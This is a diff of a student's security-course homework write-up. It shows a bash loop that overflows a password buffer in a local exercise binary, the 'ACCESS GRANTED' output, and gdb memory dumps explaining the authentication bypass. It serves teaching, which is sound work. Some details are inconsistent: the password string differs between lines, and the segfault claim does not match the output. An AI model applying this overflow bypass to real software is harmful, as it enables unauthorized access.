@@ -227,3 +227,58 @@ Like, I am demoralized when I see that an homework has been made up by a clanker
 
 **Nothing personal, really: I won't mention this to anyone** and it's just between us if this will ever be read, but I'd rather not complete the homework at these conditions :(
 -->
+
+```bash
+for n in $(seq 8 20); do
+    printf '%3d: ' $n
+    stdbuf -o0 ./program_nossp alice $(python3 -c "print('A'*$n)") 2>&1 \
+    | tr '\n' ' '
+    echo
+done
+```
+
+```
+  8: ACCESS DENIED 
+  9: ACCESS DENIED 
+ 10: ACCESS DENIED 
+ 11: ACCESS DENIED 
+ 12: ACCESS DENIED 
+ 13: ACCESS GRANTED Logged in as: alice 
+ 14: ACCESS GRANTED Logged in as: alice 
+ 15: ACCESS GRANTED Logged in as: alice 
+ 16: ACCESS GRANTED Logged in as: alice 
+ 17: ACCESS GRANTED Logged in as: alice 
+ 18: ACCESS GRANTED Logged in as: alice 
+ 19: ACCESS GRANTED Logged in as: alice 
+ 20: ACCESS GRANTED Logged in as: alice 
+```
+
+The shortest size is 13 characters.
+
+```bash
+./program_nossp alice secure1234567
+```
+
+The value in authenticated was 55.
+
+```bash
+password = "secure123456"
+authenticated = 55
+```
+
+I can justify it: 
+
+```
+(gdb) x/16bx &password
+0x7fffffffdab0:	0x73	0x65	0x63	0x75	0x72	0x65	0x31	0x32
+0x7fffffffdab8:	0x33	0x34	0x35	0x36	0x37	0x00	0x00	0x00
+```
+*This is the memory layout after the overflow, no surprise that 0x37=55*
+
+If you make the password even larger, from 17 characters onwards, the buffer overflow will do *stack smashing* thus causing a segmentation fault (and the process will fail because the kernel will send a SIGSEGV, that is not being handled).
+
+Both builds have the overflow vulnerability, but only in the latter case it goes undetected.
+
+# Part D
+
+
